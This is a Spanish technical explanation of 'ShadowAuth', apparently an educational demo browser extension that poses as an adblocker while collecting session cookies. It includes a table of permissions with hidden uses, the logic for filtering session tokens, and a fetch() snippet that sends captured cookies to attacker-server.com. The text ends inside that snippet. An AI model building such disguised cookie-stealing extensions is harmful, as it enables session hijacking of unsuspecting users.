# ShadowAuth (AdGuardian Extension) — Technical Explanation

## 📌 Índice

1. Introducción
2. Arquitectura del sistema
3. Flujo de operación legítimo
4. Flujo de operación maliciosa simulada
5. Módulos principales
6. Permisos solicitados y su impacto
7. Captura de cookies: técnica detallada
8. Simulación de exfiltración de datos
9. Defensa contra este tipo de ataques
10. Consideraciones éticas
11. Conclusión

---

## 1. Introducción

**ShadowAuth** es un proyecto de demostración que replica cómo una extensión legítima puede ocultar funcionalidades maliciosas. Funciona principalmente como un **adblocker** genuino ("AdGuardian"), pero simula una **captura de cookies de sesión** con potencial para comprometer la seguridad de los usuarios.

Este proyecto está desarrollado exclusivamente con fines educativos.

---

## 2. Arquitectura del sistema

La extensión está estructurada en tres componentes principales:

- **background.js**: Núcleo de ejecución en segundo plano.
- **popup/**: Interfaz de usuario visible para la interacción con el usuario.
- **util/cookieManager.js**: Biblioteca modular para manipulación de cookies.

Estos componentes se comunican internamente usando mensajes del API de Chrome (`runtime.sendMessage`).

---

## 3. Flujo de operación legítimo

Cuando el usuario instala AdGuardian:

- El `background.js` intercepta solicitudes HTTP.
- Se bloquean anuncios mediante filtros básicos de URL.
- La interfaz `popup.html` muestra estadísticas de anuncios bloqueados.

Este flujo es completamente legítimo y funcional.

---

## 4. Flujo de operación maliciosa simulada

Paralelamente a la función legítima:

- `background.js` monitoriza eventos de navegación (`tabs.onUpdated`, `webRequest.onCompleted`).
- `cookieManager.js` recopila cookies de sesión accesibles.
- Las cookies capturadas se almacenan de forma local y segura (`storage.local`).

> **Importante**: No se envía ningún dato real a servidores externos.

---

## 5. Módulos principales

### 🔹 background.js

- Inicializa listeners para eventos de navegación.
- Llama a funciones de bloqueo de anuncios.
- Llama a `cookieManager.js` para capturar cookies tras cada carga de página.

### 🔹 popup/

- Ofrece control visual para el usuario: on/off adblocker, estadísticas.
- Simula "normalidad" para evitar sospechas.

### 🔹 cookieManager.js

- Utiliza `chrome.cookies.getAll({domain: targetDomain})`.
- Filtra cookies relevantes (sesiones activas, cookies no `HttpOnly`).
- Almacena las cookies simuladamente.

---

## 6. Permisos solicitados y su impacto

| Permiso        | Finalidad declarada (visible) | Uso oculto (simulado)        |
|----------------|-------------------------------|-------------------------------|
| `cookies`      | Control de sesiones de anuncios | Captura de cookies de sesión  |
| `tabs`         | Identificar sitios de anuncios | Monitorizar navegación       |
| `webRequest`   | Bloqueo de contenido publicitario | Oportunidad de intercepción |
| `storage`      | Guardar configuración de usuario | Almacenar cookies capturadas  |

**Comentario**: La mayoría de los usuarios aceptan estos permisos sin sospechar.

---

## 7. Captura de cookies: técnica detallada

Cuando un usuario navega por sitios web:

- El listener de eventos detecta que la página se ha cargado.
- Se llama a `chrome.cookies.getAll()` para capturar cookies del dominio activo.
- Las cookies se analizan buscando tokens de sesión (`sessionid`, `auth_token`, `sid`, etc.).
- Las cookies válidas se almacenan en `storage.local` encriptadas (opcionalmente en futuras versiones).

Así, sin necesidad de contraseñas ni tokens 2FA adicionales, **un atacante podría reutilizar sesiones activas**.

---

## 8. Simulación de exfiltración de datos

**Nota ética**: El proyecto **no exfiltra datos reales**.

Sin embargo, se documenta cómo podría hacerse:

```javascript
// Ejemplo NO ACTIVADO en el proyecto
fetch('https://attacker-server.com/collect', {
  method: 'POST',
  body: JSON.stringify(cookiesCaptured),
  headers: {
    'Content-Type': 'application/json'
  }
});
